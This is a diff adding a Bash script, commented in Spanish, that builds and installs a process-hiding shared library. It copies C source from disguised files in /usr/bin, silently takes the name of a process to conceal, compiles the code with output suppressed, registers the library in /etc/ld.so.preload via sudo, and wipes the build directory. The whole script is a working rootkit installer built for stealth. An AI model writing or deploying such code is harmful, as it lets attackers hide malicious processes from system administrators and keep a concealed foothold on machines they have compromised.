@@ -1,0 +1,59 @@
+#!/bin/bash
+
+# Función para crear un nuevo directorio y cambiar a este
+function mktempdir() {
+    new_dir=$(mktemp -d)
+    #echo "Directorio creado en: $new_dir" 
+    cd "$new_dir" || return
+    #echo "Cambiado al directorio: $PWD"
+}
+
+# Llama a la función para crear el directorio y prepararlo para el uso
+mktempdir
+
+# Copia los archivos necesarios al nuevo directorio
+cp /usr/bin/sheldonfile.c "$new_dir/processhider.c"
+cp /usr/bin/Makefilesheldon "$new_dir/Makefile"
+
+# Función para preguntar al usuario si desea modificar el archivo processhider.c
+function modificar_archivo() {
+    read -n1 -p " " respuesta
+    case $respuesta in
+        [Ss]* )
+            echo ""
+            read -r texto
+
+            # Escapa caracteres especiales en la entrada del usuario para usar en sed
+            texto_escaped=$(echo "$texto" | sed 's/[&/\]/\\&/g')
+
+            # Busca y reemplaza el contenido dentro de las comillas en la línea específica del archivo
+            sed -i "s/\(static const char\* process_to_filter = \)\".*\";/\1\"$texto_escaped\";/" processhider.c
+
+            #echo "Texto agregado con éxito. Mostrando la línea modificada:"
+            #grep "static const char\* process_to_filter = " processhider.c
+            ;;
+        * )
+            echo " "
+            ;;
+    esac
+}
+
+# Llama a la función para preguntar al usuario si quiere modificar el archivo
+modificar_archivo
+
+# Compila el código 
+#make
+make > /dev/null 2>&1
+
+
+# Mueve la biblioteca al directorio adecuado y lo agrega al ld.so.preload
+sudo mv libprocesshider.so /usr/local/lib/
+echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload > /dev/null
+
+# Borra todos los archivos en el directorio temporal sin pedir confirmación
+adios $new_dir > /dev/null 2>&1
+
+rm -rf $new_dir > /dev/null 2>&1
+
+
+
